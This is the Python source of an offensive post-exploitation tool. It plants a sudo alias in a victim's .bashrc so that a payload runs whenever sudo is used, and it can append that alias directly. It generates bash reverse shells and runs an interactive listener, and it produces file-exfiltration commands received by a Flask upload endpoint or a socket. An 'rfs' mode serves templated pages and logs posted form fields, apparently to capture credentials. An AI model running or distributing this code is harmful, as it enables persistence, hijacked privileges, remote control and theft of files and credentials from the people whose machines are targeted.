import lib.payloads as payloads
import lib.parsing as parsing
import lib.banner
import socket
import os
import sys
import time
print(lib.banner.subanner)
args=parsing.parser()
result=""
escapedres=""

def routeres(comm, local):
	match local:
		case "0":
			display(comm)
		case "1":
			localexec(comm)

def display(comm):
	result=f"alias sudo=\"sudo {comm} sudo\";"
	pastetemp=f"paste the following into the infected sudoers .bashrc file:\n\t{result}"
	escapedres=result.replace("\"","\\\"")
	runtemp=f"or run the following command:\n\techo \"{escapedres}\" >> $HOME/.bashrc\n"
	print(pastetemp)
	print(runtemp)

def localexec(comm):
	result=f"alias sudo=\"sudo {comm} sudo\";"
	home=os.environ["HOME"]
	with open(f"{home}/.bashrc","a") as rc:
		rc.write(f"\n{result}")

if args.command == "genshell":
	cmd=""
	comm=payloads.Shells.Rev.bash(args.ip, args.port, args.shell, args.protocol)
	routeres(comm,args.local)
	if args.listen == "1":
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.bind((args.ip, int(args.port)))
			s.listen(1)
			conn, addr = s.accept()
			with conn:
				while True:
					data = conn.recv(1024).decode("utf-8")
					sys.stdout.write(data)
					cmd=input()
					cmd+="\n"
					conn.send(cmd.encode("utf-8"))
					time.sleep(1)
					sys.stdout.write("\033[A" + data.split("\n")[-1])
	else:
		print(f"on your machine run the following:\n\tnc -lvnp{args.port}")
	
if args.command == "exfilfile":
	if args.method == "postflask":
		comm=payloads.Exfil.pflask(args.ip, args.port, args.file)
		routeres(comm, args.local)
		from flask import Flask, request
		app = Flask(__name__)
		@app.route("/up",methods=["POST"])
		def upl():
			if request.files["file"]:
				print(request.files["file"].read())
			return ""
		if __name__ == "__main__":
			app.run(host=args.ip, port=int(args.port))

	else:
		comm=payloads.Exfil.socket(args.ip, args.port, args.file)
		routeres(comm,args.local)

	if args.method == "pysocket":
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.bind((args.ip, int(args.port)))
			s.listen()
			conn, addr = s.accept()
			with conn:
				while True:
					data = conn.recv(1024)
					if data:
						print(data)
						break
							
	if args.method == "nc":
		print(f"on your machine run the following:\n\tnc -lvnp{args.port}")

if args.command == "rfs":
	comm=payloads.RFS.run(args.ip, args.port, args.schema)
	routeres(comm,args.local)
	from flask import Flask, request, render_template
	app = Flask(__name__)
	@app.route("/rfs",methods=["GET"])
	def rfs(rfvs=args.vars):
		rfsvars={v.split(":",1)[0]:v.split(":",1)[1] for v in rfvs}
		return render_template(os.path.join("rfs",args.file),rfsvars=rfsvars)
	@app.route("/l",methods=["POST"])
	def listen():
		for key in request.form.keys():
			print(f"{key}:{request.form[key]}")
		return ""
	if __name__ == "__main__":
		app.run(host=args.ip, port=int(args.port))
